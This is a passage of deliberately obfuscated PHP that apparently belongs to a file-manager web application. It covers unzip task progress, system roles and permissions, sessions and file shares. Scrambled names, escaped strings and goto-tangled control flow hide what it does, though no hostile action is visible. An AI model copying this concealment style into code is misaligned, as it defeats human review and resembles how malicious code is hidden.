$FÄ®’ò¢³[1516])); Hook::bind($FÄ®’ò¢³[1491], array($this, $FÄ®’ò¢³[1517])); } protected function endAfter() { $DæÙ¡‰ùÏÌ =& $_SERVER[¬ˆÚÂ”Éğä]; Hook::unbind($DæÙ¡‰ùÏÌ[1487], array($this, $DæÙ¡‰ùÏÌ[1515])); Hook::unbind($DæÙ¡‰ùÏÌ[1489], array($this, $DæÙ¡‰ùÏÌ[1516])); Hook::unbind($DæÙ¡‰ùÏÌ[1491], array($this, $DæÙ¡‰ùÏÌ[1517])); } public function progressStart($D‘ò¦šùçí) { $AƒøÑ å =& $_SERVER[¬ˆÚÂ”Éğä]; $D£äçÄâ£’ = curl_getinfo($D‘ò¦šùçí); self::log($AƒøÑ å[1518] . $D£äçÄâ£’[$AƒøÑ å[295]]); self::valueSet($this->task[$AƒøÑ å[367]], $this->task); } public function progressEnd($aµìƒÙ¢¥») { $B¤êÃŠ†” =& $_SERVER[¬ˆÚÂ”Éğä]; self::log($B¤êÃŠ†”[1519] . $this->task[$B¤êÃŠ†”[367]]); $this->end(); } public function progress($fÏ…‘ „, $D†ñÍ°×¦Ø, $bñÓ°ÚÓÌÜ, $fÃÀïµÍâç, $E°‰×«‚ä¢) { $cËĞŞÂ¿£ğ =& $_SERVER[¬ˆÚÂ”Éğä]; $a‰ŞÓãĞ¶Ò =& $this->task; if ($E°‰×«‚ä¢ > 0) { $a‰ŞÓãĞ¶Ò[$cËĞŞÂ¿£ğ[989]] = $a‰ŞÓãĞ¶Ò[$cËĞŞÂ¿£ğ[989]] == 0 ? $fÃÀïµÍâç : $a‰ŞÓãĞ¶Ò[$cËĞŞÂ¿£ğ[989]]; $a‰ŞÓãĞ¶Ò[$cËĞŞÂ¿£ğ[1003]] = $E°‰×«‚ä¢; } else { if ($bñÓ°ÚÓÌÜ > 0) { $a‰ŞÓãĞ¶Ò[$cËĞŞÂ¿£ğ[989]] = $a‰ŞÓãĞ¶Ò[$cËĞŞÂ¿£ğ[989]] == 0 ? $D†ñÍ°×¦Ø : $a‰ŞÓãĞ¶Ò[$cËĞŞÂ¿£ğ[989]]; $a‰ŞÓãĞ¶Ò[$cËĞŞÂ¿£ğ[1003]] = $bñÓ°ÚÓÌÜ; } } $this->update(); self::log("\x70\x72\157\x67\x72\x65\x73\163\x48\164\164\160\72\144\x6f\167\156\72{$bñÓ°ÚÓÌÜ}\57{$D†ñÍ°×¦Ø}\73\40\x75\160\x6c\x6f\141\144\72{$E°‰×«‚ä¢}\x2f{$fÃÀïµÍâç}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto CèºÊÇ††‘; D¿ß¬±§ª: if (!$EÔ¼³ŒÎÅ[$DÜÍˆìÊì»[1356]]) { $EÔ¼³ŒÎÅ[$DÜÍˆìÊì»[1356]] = LNG($DÜÍˆìÊì»[1524]); } goto F¹±»ØÆİ; Aœ™¦í²Êè: Hook::bind($DÜÍˆìÊì»[1048], array($this, $DÜÍˆìÊì»[1522])); $EÔ¼³ŒÎÅ =& $this->task; $EÔ¼³ŒÎÅ[$DÜÍˆìÊì»[1523]] = $DÜÍˆìÊì»[1053]; goto D¿ß¬±§ª; CèºÊÇ††‘: $DÜÍˆìÊì» =& $_SERVER[¬ˆÚÂ”Éğä]; parent::startAfter(); Hook::bind($DÜÍˆìÊì»[1520], array($this, $DÜÍˆìÊì»[1521])); goto Aœ™¦í²Êè; F¹±»ØÆİ: } protected function endAfter() { $B‘ÖôÑïŸó =& $_SERVER[¬ˆÚÂ”Éğä]; parent::endAfter(); Hook::unbind($B‘ÖôÑïŸó[1520], array($this, $B‘ÖôÑïŸó[1521])); Hook::unbind($B‘ÖôÑïŸó[1048], array($this, $B‘ÖôÑïŸó[1522])); } public function updateAfter() { $b¬ŠğªâÚƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $DˆÁ¯õ‹†× =& $this->task; if (!$DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[989]] || !$DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[706]]) { return; } if ($DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1523]] == $b¬ŠğªâÚƒ[1053]) { $EáøæÁ® = 0; if ($DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1495]]) { $EáøæÁ® = $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1496]] / $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1495]]; } $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1451]] = $EáøæÁ® * 0.3; } else { if ($DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1523]] == $b¬ŠğªâÚƒ[301]) { $EáøæÁ® = $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1003]] / $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[989]]; $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1451]] = 0.3 + $EáøæÁ® * 0.4; } else { if ($DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1523]] == $b¬ŠğªâÚƒ[103]) { $dè¢Şò³œ = 0; if ($DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1497]] == $b¬ŠğªâÚƒ[103]) { $dè¢Şò³œ = $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1496]]; } $EáøæÁ® = ($DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1500]] + $dè¢Şò³œ) / $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[706]]; $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1451]] = 0.3 + 0.4 + $EáøæÁ® * 0.3; } } } if ($DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1451]] > 0) { $e‰—›´Ó¢‰ = timeFloat() - $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1453]] - $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1456]]; $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1457]] = $e‰—›´Ó¢‰ * (1 - $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1451]]) / $DˆÁ¯õ‹†×[$b¬ŠğªâÚƒ[1451]]; } } public function addFile($f‚›ÔÒ§‚ø) { goto dˆ¹ëÉ®àá; e’ÄÔâõ²¯: $f¡¢á×ø‘Î[$a¢‰—¹¹·‚[991]] = $a¢‰—¹¹·‚[1512]; $f¡¢á×ø‘Î[$a¢‰—¹¹·‚[1497]] = $a¢‰—¹¹·‚[1053]; $f¡¢á×ø‘Î[$a¢‰—¹¹·‚[706]] = $aâÉ˜¹î‰[$a¢‰—¹¹·‚[77]]; goto A•ªíÃÌˆ¾; A•ªíÃÌˆ¾: $f¡¢á×ø‘Î[$a¢‰—¹¹·‚[989]] = 1; $B‰¢ØÍŞØ— = 0; $f¡¢á×ø‘Î[$a¢‰—¹¹·‚[1504]] = array($a¢‰—¹¹·‚[1505] => $B‰¢ØÍŞØ— + 1, $a¢‰—¹¹·‚[386] => $aâÉ˜¹î‰[$a¢‰—¹¹·‚[28]], $a¢‰—¹¹·‚[75] => $aâÉ˜¹î‰[$a¢‰—¹¹·‚[75]], $a¢‰—¹¹·‚[468] => $aâÉ˜¹î‰[$a¢‰—¹¹·‚[468]] ? $aâÉ˜¹î‰[$a¢‰—¹¹·‚[468]] : $aâÉ˜¹î‰[$a¢‰—¹¹·‚[75]]); goto EÒ–êËÛáê; a««§›Ö‹’: $f¡¢á×ø‘Î[$a¢‰—¹¹·‚[1493]] = $aâÉ˜¹î‰[$a¢‰—¹¹·‚[28]]; $f¡¢á×ø‘Î[$a¢‰—¹¹·‚[1495]] = $aâÉ˜¹î‰[$a¢‰—¹¹·‚[77]]; $f¡¢á×ø‘Î[$a¢‰—¹¹·‚[1496]] = 0; goto e’ÄÔâõ²¯; EÒ–êËÛáê: $this->update(); goto BæÎÚ‘ ÚÄ; dˆ¹ëÉ®àá: $a¢‰—¹¹·‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $f¡¢á×ø‘Î =& $this->task; $aâÉ˜¹î‰ = IO::info($f‚›ÔÒ§‚ø); goto a««§›Ö‹’; BæÎÚ‘ ÚÄ: } public function unzipAfter($F±…ùÖã‹‚) { goto DÜæÏò£‹ì; bœêæ»˜­: if ($E¿ÑºÉ†œØ[$a×‰æèÇî[29]] == $a×‰æèÇî[167]) { $Eó³‡íÒ³©[$a×‰æèÇî[989]] = 1; } else { $Eó³‡íÒ³©[$a×‰æèÇî[989]] = $E¿ÑºÉ†œØ[$a×‰æèÇî[80]][$a×‰æèÇî[78]]; } $Eó³‡íÒ³©[$a×‰æèÇî[991]] = $a×‰æèÇî[33]; $Eó³‡íÒ³©[$a×‰æèÇî[1497]] = 0; goto C™«§ÎÉÆ…; DÜæÏò£‹ì: $a×‰æèÇî =& $_SERVER[¬ˆÚÂ”Éğä]; $Eó³‡íÒ³© =& $this->task; $Eó³‡íÒ³©[$a×‰æèÇî[1523]] = $a×‰æèÇî[103]; goto Eî§ğ„‡ÉÍ; C™«§ÎÉÆ…: $Eó³‡íÒ³©[$a×‰æèÇî[1003]] = 0; $Eó³‡íÒ³©[$a×‰æèÇî[1495]] = 0; $Eó³‡íÒ³©[$a×‰æèÇî[1496]] = 0; goto F†éèƒÎ™; A§‰ßô¾Ü: $this->update(); self::log($a×‰æèÇî[1525] . json_encode(array($Eó³‡íÒ³©, $E¿ÑºÉ†œØ))); goto aÈĞÒÌâ­; Eî§ğ„‡ÉÍ: $E¿ÑºÉ†œØ = IO::infoWithChildren($F±…ùÖã‹‚); $A²ÆœÑÃïõ = 0; $Eó³‡íÒ³©[$a×‰æèÇî[1504]] = array($a×‰æèÇî[1505] => $A²ÆœÑÃïõ + 1, $a×‰æèÇî[386] => $E¿ÑºÉ†œØ[$a×‰æèÇî[28]], $a×‰æèÇî[75] => $E¿ÑºÉ†œØ[$a×‰æèÇî[75]], $a×‰æèÇî[468] => $E¿ÑºÉ†œØ[$a×‰æèÇî[468]] ? $E¿ÑºÉ†œØ[$a×‰æèÇî[468]] : $E¿ÑºÉ†œØ[$a×‰æèÇî[75]]); goto bœêæ»˜­; F†éèƒÎ™: $Eó³‡íÒ³©[$a×‰æèÇî[1493]] = $a×‰æèÇî[33]; $Eó³‡íÒ³©[$a×‰æèÇî[1500]] = 0; $Eó³‡íÒ³©[$a×‰æèÇî[706]] = $E¿ÑºÉ†œØ[$a×‰æèÇî[77]]; goto A§‰ßô¾Ü; aÈĞÒÌâ­: } public function nameParse($BÜ£òäëìÒ) { goto aÔ³„¢âò; aÔ³„¢âò: $CÜÉŞÎ–õ =& $_SERVER[¬ˆÚÂ”Éğä]; $eäÔ•¯‚­ =& $this->task; if ($eäÔ•¯‚­[$CÜÉŞÎ–õ[1523]] == $CÜÉŞÎ–õ[1053]) { $eäÔ•¯‚­[$CÜÉŞÎ–õ[1523]] = $CÜÉŞÎ–õ[301]; $eäÔ•¯‚­[$CÜÉŞÎ–õ[1500]] = 0; $eäÔ•¯‚­[$CÜÉŞÎ–õ[706]] = 0; } goto aØĞ»˜ª„ï; eëÇ¼ê¹¨: $this->update(); goto CÈŸÓÙ¹É; aØĞ»˜ª„ï: $DËĞ¤ƒÈÃ× = get_path_this($BÜ£òäëìÒ); if (strstr($DËĞ¤ƒÈÃ×, $CÜÉŞÎ–õ[91])) { $eäÔ•¯‚­[$CÜÉŞÎ–õ[1003]] += 1; $eäÔ•¯‚­[$CÜÉŞÎ–õ[989]] += 1; } $eäÔ•¯‚­[$CÜÉŞÎ–õ[1493]] = $BÜ£òäëìÒ; goto eëÇ¼ê¹¨; CÈŸÓÙ¹É: } } goto cåÁÄØº—´; CÚ½Ó«ÎÕ‰: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\145\155\137\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\157\154\x65", "\162\x6f\x6c\145\x47\x72\x6f\x75\160", "\x72\x65\147\x69\x73\x74", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($AŒĞîôõ©) { return "\x53\171\163\x74\x65\155\x4f\x70\x74\151\157\156\137{$AŒĞîôõ©}"; } protected function optionDefault($f¬¿‘¯¿†É = '') { $fÍç³†°¡Ô =& $_SERVER[¬ˆÚÂ”Éğä]; if ($f¬¿‘¯¿†É == $fÍç³†°¡Ô[33]) { return $GLOBALS[$fÍç³†°¡Ô[6]][$fÍç³†°¡Ô[2527]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\162\x6f\154\145\x4c\151\x73\164"; public $field = array("\156\x61\155\145", "\141\x75\x74\150", "\x6c\x61\x62\145\154", "\x64\x69\x73\x70\x6c\141\171", "\x73\171\x73\164\x65\x6d", "\x64\145\x73\x63", "\x69\147\x6e\x6f\162\x65\105\170\164", "\x69\x67\156\x6f\x72\145\106\151\154\x65\x53\151\x7a\145", "\x61\x64\155\x69\x6e\x69\x73\164\x72\x61\x74\x6f\x72", "\x73\157\162\164"); public function listData($aŒ†á›¥ˆê = false, $cŠØë²ñ÷ = "\x73\157\x72\164", $EËÙ®ÂÄÅ‡ = false) { $aŸÉÀ±×¯¼ =& $_SERVER[¬ˆÚÂ”Éğä]; $DöğŠèßÔ¢ = parent::listData($aŒ†á›¥ˆê, $cŠØë²ñ÷, $EËÙ®ÂÄÅ‡); if (!$aŒ†á›¥ˆê) { $D÷¬Ó®‰÷ = $aŸÉÀ±×¯¼[2528]; foreach ($DöğŠèßÔ¢ as $Bäù„ŸĞ‚î => $d¤‹ĞùÂ†) { if ($d¤‹ĞùÂ†[$aŸÉÀ±×¯¼[2308]] == 1) { $DöğŠèßÔ¢[$Bäù„ŸĞ‚î][$aŸÉÀ±×¯¼[405]] = $D÷¬Ó®‰÷; } } } return $DöğŠèßÔ¢; } public function update($f¸’ÇÕÃˆ, $bš³ß¸…°) { goto CÕôÅ¤Ø‚ñ; CÕôÅ¤Ø‚ñ: $Cá†ô¶³Ø¤ =& $_SERVER[¬ˆÚÂ”Éğä]; $fØçùŞĞ¡ = parent::listData($f¸’ÇÕÃˆ); $f†¶±åôÃÖ = $this->findByName($bš³ß¸…°[$Cá†ô¶³Ø¤[28]]); goto béÊ‡ŞÂ²¢; F¥äÜê¨ : return parent::update($f¸’ÇÕÃˆ, $bš³ß¸…°); goto EõÄ§ä™â¸; béÊ‡ŞÂ²¢: if (!$fØçùŞĞ¡ || $f†¶±åôÃÖ && $f†¶±åôÃÖ[$Cá†ô¶³Ø¤[367]] != $fØçùŞĞ¡[$Cá†ô¶³Ø¤[367]]) { return !1; } if ($f†¶±åôÃÖ[$Cá†ô¶³Ø¤[2308]] == 1) { $bš³ß¸…° = array($Cá†ô¶³Ø¤[28] => $bš³ß¸…°[$Cá†ô¶³Ø¤[28]], $Cá†ô¶³Ø¤[2140] => $bš³ß¸…°[$Cá†ô¶³Ø¤[2140]]); } $this->filterAuth($bš³ß¸…°[$Cá†ô¶³Ø¤[376]]); goto F¥äÜê¨ ; EõÄ§ä™â¸: } public function remove($fê½»Œ‡àÙ) { $CÃÇéØôíİ = parent::listData($fê½»Œ‡àÙ); if (!$CÃÇéØôíİ || $CÃÇéØôíİ[$_SERVER[¬ˆÚÂ”Éğä][1093]]) { return !1; } return parent::remove($fê½»Œ‡àÙ); } public function add($b÷óëÜµ„×) { goto a÷ë¤é²È; CÖ™î—§…: return parent::insert($b÷óëÜµ„×); goto eÅ£†®Â; a÷ë¤é²È: $EÊ«˜µ‹ÚË =& $_SERVER[¬ˆÚÂ”Éğä]; $c´´Çì°® = $b÷óëÜµ„×[$EÊ«˜µ‹ÚË[28]]; if ($this->findByName($c´´Çì°®)) { return !1; } goto bÕÚµò¶Ä; bÕÚµò¶Ä: $dÎ¸œãó• = array($EÊ«˜µ‹ÚË[386] => $c´´Çì°®, $EÊ«˜µ‹ÚË[2127] => $EÊ«˜µ‹ÚË[33], $EÊ«˜µ‹ÚË[2123] => $EÊ«˜µ‹ÚË[2141], $EÊ«˜µ‹ÚË[2529] => 1, $EÊ«˜µ‹ÚË[2126] => 0, $EÊ«˜µ‹ÚË[2530] => 0, $EÊ«˜µ‹ÚË[2125] => $this->getSort()); $b÷óëÜµ„× = array_merge($dÎ¸œãó•, $b÷óëÜµ„×); $this->filterAuth($b÷óëÜµ„×[$EÊ«˜µ‹ÚË[376]]); goto CÖ™î—§…; eÅ£†®Â: } private function getSort() { $a’Œí¶ÛÔŞ =& $_SERVER[¬ˆÚÂ”Éğä]; $eßíë×–™ = parent::listData(); $FÀÇÃ‘Øéç = array_to_keyvalue($eßíë×–™, $a’Œí¶ÛÔŞ[33], $a’Œí¶ÛÔŞ[2143]); return empty($FÀÇÃ‘Øéç) ? 0 : max($FÀÇÃ‘Øéç) + 1; } private function filterAuth(&$Bö‰¯˜’·) { $Bà–®¸Ø³É =& $_SERVER[¬ˆÚÂ”Éğä]; $b‘”é«¹ëœ = array(); $d–ºµ÷…Ô¾ = array_filter(explode($Bà–®¸Ø³É[47], $Bö‰¯˜’·)); foreach ($d–ºµ÷…Ô¾ as $Bö‰¯˜’·) { $D›îĞôÈá = explode($Bà–®¸Ø³É[91], $Bö‰¯˜’·); if ($D›îĞôÈá[0] == $Bà–®¸Ø³É[1798] && $D›îĞôÈá[1] != $Bà–®¸Ø³É[1049]) { $AÚÍœ‰À¯ = $D›îĞôÈá[0] . $Bà–®¸Ø³É[91] . $D›îĞôÈá[1] . $Bà–®¸Ø³É[2531]; if (!in_array($AÚÍœ‰À¯, $d–ºµ÷…Ô¾)) { $b‘”é«¹ëœ[] = $AÚÍœ‰À¯; } } $b‘”é«¹ëœ[] = $Bö‰¯˜’·; } $Bö‰¯˜’· = implode($Bà–®¸Ø³É[47], $b‘”é«¹ëœ); } public function sort($aŸóµ°ÛÏ‡, $a†°À­Õ¤) { return parent::update($aŸóµ°ÛÏ‡, $a†°À­Õ¤); } } goto EŞ¶Àã¼Ş; Bİß‡ôóå: class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\x5f\x73\x65\x73\163\x69\157\156"; public function get($e×°ßÄ£æ) { $eùˆõ³Â…‰ =& $_SERVER[¬ˆÚÂ”Éğä]; $A£¦¹ßîéŸ = $this->where(array($eùˆõ³Â…‰[2240] => $e×°ßÄ£æ))->find(); if (!is_array($A£¦¹ßîéŸ)) { return !1; } return $A£¦¹ßîéŸ[$eùˆõ³Â…‰[700]]; } public function set($f›Ó”±², $FŒ¡÷Ì‡±Ó, $a·›åùˆ¯ = 3600) { $eôì‚Äİ÷ =& $_SERVER[¬ˆÚÂ”Éğä]; $F¹È§Ë¯ÛÛ = array($eôì‚Äİ÷[2240] => $f›Ó”±², $eôì‚Äİ÷[2152] => $FŒ¡÷Ì‡±Ó, $eôì‚Äİ÷[2241] => $a·›åùˆ¯ + time()); if (Session::get($eôì‚Äİ÷[2242])) { $F¹È§Ë¯ÛÛ[$eôì‚Äİ÷[1450]] = Session::get($eôì‚Äİ÷[2242]); } else { $F¹È§Ë¯ÛÛ[$eôì‚Äİ÷[1450]] = 0; } if ($this->get($f›Ó”±²)) { return $this->where(array($eôì‚Äİ÷[2240] => $f›Ó”±²))->save($F¹È§Ë¯ÛÛ); } else { return $this->add($F¹È§Ë¯ÛÛ, array(), !0); } } public function remove($fÍ¯£¨áÂ) { return $this->where(array($_SERVER[¬ˆÚÂ”Éğä][2240] => $fÍ¯£¨áÂ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¬ˆÚÂ”Éğä][2243] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\x54\151\155\x65", "\x74\151\155\145", "\x69\x6e\x73\x65\x72\x74\54\x75\160\144\141\164\145", "\146\165\x6e\x63\164\x69\x6f\x6e"), array("\x63\x72\x65\141\164\145\124\x69\155\x65", "\164\151\155\x65", "\x69\x6e\x73\x65\162\x74", "\146\x75\156\143\x74\x69\x6f\x6e"), array("\x6f\160\164\x69\x6f\x6e\163", '', "\151\x6e\163\145\x72\164\54\x75\x70\x64\x61\164\x65\x2c\x73\145\154\145\143\164", "\152\163\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($f×¯½ñèãò) { $E¾¿äç–…— =& $_SERVER[¬ˆÚÂ”Éğä]; $dĞ—À‰øÛÅ = isset($f×¯½ñèãò[0]) ? $f×¯½ñèãò[0] : !1; return array($E¾¿äç–…—[2244] => array(USER_ID, $E¾¿äç–…—[2245]), $E¾¿äç–…—[2192] => array($dĞ—À‰øÛÅ, $E¾¿äç–…—[2246])); } protected function listSimple() { $eÍ¬Âç¶ñ¼ = array($_SERVER[¬ˆÚÂ”Éğä][1450] => USER_ID); $eÇ–´ÆõÊÆ = $this->field($this->fieldList)->where($eÍ¬Âç¶ñ¼)->select(); return $eÇ–´ÆõÊÆ ? $eÇ–´ÆõÊÆ : array(); } protected function getInfo($A†¬ì¦”«ò, $b£–Ùê½‚˜ = false) { $DÇ¶Á¥çïÔ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($b£–Ùê½‚˜) { return $this->_getShareInfo(array($DÇ¶Á¥çïÔ[441] => $A†¬ì¦”«ò)); } $B¡Çñß‰ï– = $this->cacheFunctionGet($DÇ¶Á¥çïÔ[2247], $A†¬ì¦”«ò); return $B¡Çñß‰ï–; } public function getInfoByHash($e’§ï·šóâ) { return $this->_getShareInfo(array($_SERVER[¬ˆÚÂ”Éğä][443] => $e’§ï·šóâ)); } public function getInfoByPath($dãà†ÑøĞ¥) { $E”¦İ×‡‹¶ =& $_SERVER[¬ˆÚÂ”Éğä]; $b­±ÁçÖ = array($E”¦İ×‡‹¶[1450] => USER_ID, $E”¦İ×‡‹¶[369] => $dãà†ÑøĞ¥); return $this->_getShareInfo($b­±ÁçÖ); } public function getInfoBySourcePath($a¥öËˆÄÍ„) { $f±Œ–è— =& $_SERVER[¬ˆÚÂ”Éğä]; $c×ÁÃ´¡Æ¯ = array($f±Œ–è—[1450] => USER_ID, $f±Œ–è—[1032] => $a¥öËˆÄÍ„); return $this->_getShareInfo($c×ÁÃ´¡Æ¯); } private function _getShareInfo($bø‡Éá¾è) { goto BÆµğ«’é¨; A‹©àóš£¤: $bø‡Éá¾è = array($aë›‡ £ÒÕ[441] => $AŞ²æôÉ‰[$aë›‡ £ÒÕ[441]]); $BğªŞÆÜì’ = $aë›‡ £ÒÕ[2248]; $f„¥‚ÑÃÔ¼ = Model($aë›‡ £ÒÕ[539])->order($aë›‡ £ÒÕ[367])->field($BğªŞÆÜì’)->where($bø‡Éá¾è)->select(); goto B³¹¸Ó×èÄ; B³¹¸Ó×èÄ: if ($AŞ²æôÉ‰[$aë›‡ £ÒÕ[369]] == $aë›‡ £ÒÕ[470]) { $AŞ²æôÉ‰[$aë›‡ £ÒÕ[391]] = IO::info($AŞ²æôÉ‰[$aë›‡ £ÒÕ[1032]]); } else { $AŞ²æôÉ‰[$aë›‡ £ÒÕ[391]] = Model($aë›‡ £ÒÕ[1130])->pathInfo($AŞ²æôÉ‰[$aë›‡ £ÒÕ[369]]); } $AŞ²æôÉ‰[$aë›‡ £ÒÕ[2249]] = $f„¥‚ÑÃÔ¼; return $AŞ²æôÉ‰; goto F‹¢“á²Úå; BÆµğ«’é¨: $aë›‡ £ÒÕ =& $_SERVER[¬ˆÚÂ”Éğä]; $AŞ²æôÉ‰ = $this->where($bø‡Éá¾è)->find(); if (!$AŞ²æôÉ‰) { return !1; } goto A‹©àóš£¤; F‹¢“á²Úå: } protected function getInfoAuth($D‰áŒô‚Ã) { $d»çÖ‰Ûº =& $_SERVER[¬ˆÚÂ”Éğä]; $C¤™«…¿±é = $this->getInfo($D‰áŒô‚Ã); $C¤™«…¿±é[$d»çÖ‰Ûº[376]] = Model($d»çÖ‰Ûº[456])->authMake($C¤™«…¿±é[$d»çÖ‰Ûº[2249]]); return $C¤™«…¿±é; } protected function listData($D°Ì§—Ğˆ÷ = null, $AİÎ”Ğ¢ = 300) { $EêÃ“§Éì® =& $_SERVER[¬ˆÚÂ”Éğä]; $b‰‰äç’§£ = array(array($EêÃ“§Éì®[446] => array($EêÃ“§Éì®[938], 0), $EêÃ“§Éì®[448] => array($EêÃ“§Éì®[938], 0), $EêÃ“§Éì®[2250] => $EêÃ“§Éì®[2206])); if ($D°Ì§—Ğˆ÷ == $EêÃ“§Éì®[1887]) { $b‰‰äç’§£ = array($EêÃ“§Éì®[446] => 1); } else { if ($D°Ì§—Ğˆ÷ == $EêÃ“§Éì®[1021]) { $b‰‰äç’§£ = array($EêÃ“§Éì®[448] => 1); } } $b‰‰äç’§£[$EêÃ“§Éì®[1450]] = USER_ID; $b¶Ù‹Ùô‘‹ = $this->where($b‰‰äç’§£)->selectPage($AİÎ”Ğ¢); return $b¶Ù‹Ùô‘‹; } protected function listToMe($cö‰ ÷ÓÛ® = 300) { goto c¼İ±™Š¯È; f¿õ˜¡÷«Î: $aÙ÷·ÎÖØ” = $this->field($bˆ²ÛÅ‰÷)->where($D’£æÜ)->select(); foreach ($aÙ÷·ÎÖØ” as $e£°“†ª’ğ => &$C÷¶¶½Ö«ô) { $C÷¶¶½Ö«ô[$cÎ„àçñÆÛ[2249]] = $Dì¬ôîÌÈŞ[$C÷¶¶½Ö«ô[$cÎ„àçñÆÛ[441]]]; } unset($C÷¶¶½Ö«ô); goto fŸ°Î·¦; fŸ°Î·¦: $e¨ïËÉµ• = array($cÎ„àçñÆÛ[2253] => $aÙ÷·ÎÖØ”, $cÎ„àçñÆÛ[2254] => $DÀÊ«¼ø•‚[$cÎ„àçñÆÛ[351]]); return $e¨ïËÉµ•; goto dš¬£ËË¶¬; F£·ÇŞ™Ùİ: if (!$Dì¬ôîÌÈŞ) { return $DÀÊ«¼ø•‚; } $bˆ²ÛÅ‰÷ = $cÎ„àçñÆÛ[2252]; $D’£æÜ = array($cÎ„àçñÆÛ[441] => array($cÎ„àçñÆÛ[384], array_keys($Dì¬ôîÌÈŞ))); goto f¿õ˜¡÷«Î; a»Ä½ä…İ: if ($E§Ø’ë‚Ó) { $D’£æÜ = array(array($cÎ„àçñÆÛ[523] => SourceModel::TYPE_USER, $cÎ„àçñÆÛ[458] => USER_ID), array($cÎ„àçñÆÛ[523] => SourceModel::TYPE_GROUP, $cÎ„àçñÆÛ[458] => array($cÎ„àçñÆÛ[7], $E§Ø’ë‚Ó)), $cÎ„àçñÆÛ[2250] => $cÎ„àçñÆÛ[2206]); } $DÀÊ«¼ø•‚ = Model($cÎ„àçñÆÛ[539])->where($D’£æÜ)->selectPage($cö‰ ÷ÓÛ®); $Dì¬ôîÌÈŞ = array_to_keyvalue_group($DÀÊ«¼ø•‚[$cÎ„àçñÆÛ[354]], $cÎ„àçñÆÛ[441]); goto F£·ÇŞ™Ùİ; c¼İ±™Š¯È: $cÎ„àçñÆÛ =& $_SERVER[¬ˆÚÂ”Éğä]; $E§Ø’ë‚Ó = Model($cÎ„àçñÆÛ[2251])->userGroupParents(USER_ID); $D’£æÜ = array($cÎ„àçñÆÛ[523] => SourceModel::TYPE_USER, $cÎ„àçñÆÛ[458] => USER_ID); goto a»Ä½ä…İ; dš¬£ËË¶¬: } protected function shareAdd($f×í’õ†Œà, $eÜïä“ˆªõ) { $ašÖİÉ­Íª =& $_SERVER[¬ˆÚÂ”Éğä]; $Dœ‰±Õ§×Å = $this->_addShareData($f×í’õ†Œà, $eÜïä“ˆªõ); if (!empty($eÜïä“ˆªõ[$ašÖİÉ­Íª[2255]])) { $this->_shareAuthSet($Dœ‰±Õ§×Å, $eÜïä“ˆªõ[$ašÖİÉ­Íª[2255]]); } $this->shareEventAdd($f×í’õ†Œà, $eÜïä“ˆªõ, $ašÖİÉ­Íª[1024]); return $Dœ‰±Õ§×Å; } private function shareEventAdd($A’ÈÛ•‡à¨, $Bñ¸ºÜ•éæ, $DÛ’•¨à¹“ = "\141\x64\x64") { goto Fšµ¦Õ•ŸÊ; b˜µÎŒáˆ¸: if ($Aè“Ì´ã’Ó[$C‡¤áîñ´[448]] == $C‡¤áîñ´[470] && $Bñ¸ºÜ•éæ[$C‡¤áîñ´[448]] == $C‡¤áîñ´[83]) { $b—»–êâœÃ = $C‡¤áîñ´[2257]; } if ($Aè“Ì´ã’Ó[$C‡¤áîñ´[448]] == $C‡¤áîñ´[83] && $Bñ¸ºÜ•éæ[$C‡¤áîñ´[448]] == $C‡¤áîñ´[470]) { $b—»–êâœÃ = $C‡¤áîñ´[2260]; } Model($C‡¤áîñ´[507])->eventShare($A’ÈÛ•‡à¨, $b—»–êâœÃ); goto eª–°öå†Ô; E¨Ş˜»âè¨: $b—»–êâœÃ = $C‡¤áîñ´[2258]; if ($Aè“Ì´ã’Ó[$C‡¤áîñ´[446]] == $C‡¤áîñ´[470] && $Bñ¸ºÜ•éæ[$C‡¤áîñ´[446]] == $C‡¤áîñ´[83]) { $b—»–êâœÃ = $C‡¤áîñ´[2256]; } if ($Aè“Ì´ã’Ó[$C‡¤áîñ´[446]] == $C‡¤áîñ´[83] && $Bñ¸ºÜ•éæ[$C‡¤áîñ´[446]] == $C‡¤áîñ´[470]) { $b—»–êâœÃ = $C‡¤áîñ´[2259]; } goto b˜µÎŒáˆ¸; eª–°öå†Ô: return; goto F×îØˆ‡¯Å; Fšµ¦Õ•ŸÊ: $C‡¤áîñ´ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($DÛ’•¨à¹“ == $C‡¤áîñ´[1024]) { if ($Bñ¸ºÜ•éæ[$C‡¤áîñ´[446]] == $C‡¤áîñ´[83]) { 